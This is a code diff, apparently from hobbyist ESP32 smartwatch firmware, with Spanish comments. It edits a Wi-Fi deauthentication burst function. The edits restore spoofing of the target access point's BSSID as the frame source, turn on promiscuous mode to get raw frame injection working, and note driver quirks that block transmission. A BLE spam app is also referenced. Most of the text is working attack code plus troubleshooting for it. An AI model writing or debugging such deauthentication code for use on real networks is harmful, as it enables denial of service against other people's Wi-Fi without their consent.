@@ -203,13 +203,8 @@ static uint8_t deauthFrame[26] = {
 void WatchyHackchyOS::deauthBurst() {
   if (deauthSel < 0 || deauthSel >= wifiCount) { deauthRunning = false; return; }
   const uint8_t *bssid = wifiBSSID[deauthSel];
-  // DIAGNÓSTICO TEMPORAL (quitar en cuanto tengamos el código de error):
-  // probamos con la MAC propia como origen en vez de la del AP objetivo,
-  // para ver si el 0x102 viene de que el driver rechaza falsear el origen.
-  uint8_t ownMac[6];
-  esp_wifi_get_mac(WIFI_IF_STA, ownMac);
-  memcpy(deauthFrame + 10, ownMac, 6);   // origen: iba bssid, ahora MAC propia
-  memcpy(deauthFrame + 16, bssid, 6);    // BSSID del objetivo: se mantiene
+  memcpy(deauthFrame + 10, bssid, 6);
+  memcpy(deauthFrame + 16, bssid, 6);
   esp_wifi_set_channel(wifiChan[deauthSel], WIFI_SECOND_CHAN_NONE);
   for (int i = 0; i < 10; i++) {
     // en_sys_seq = true: en IDF 5.x (core ESP32 3.x), si la interfaz ya está
@@ -224,6 +219,7 @@ void WatchyHackchyOS::deauthBurst() {
 
 void WatchyHackchyOS::stopDeauth() {
   deauthRunning = false;
+  esp_wifi_set_promiscuous(false);
   WiFi.mode(WIFI_OFF);
 }
 
@@ -581,6 +577,11 @@ void WatchyHackchyOS::openApp(AppId id) {
       // el radio entre operaciones: esp_wifi_80211_tx() puede devolver ESP_OK
       // sin que la trama llegue a salir por el aire. Imprescindible para TX.
       esp_wifi_set_ps(WIFI_PS_NONE);
+      // DIAGNÓSTICO: ESP_ERR_INVALID_ARG persiste en esp_wifi_80211_tx() pase
+      // lo que pase en la trama; probamos si el driver exige promiscuo activo
+      // para inyectar (la única diferencia estructural con el monitor, que sí
+      // transmite/recibe sin problema). Quitar si no cambia el error.
+      esp_wifi_set_promiscuous(true);
       break;
     case APP_BLESPAM:
       // nunca empieza a transmitir sola, hay que armarla con MENU
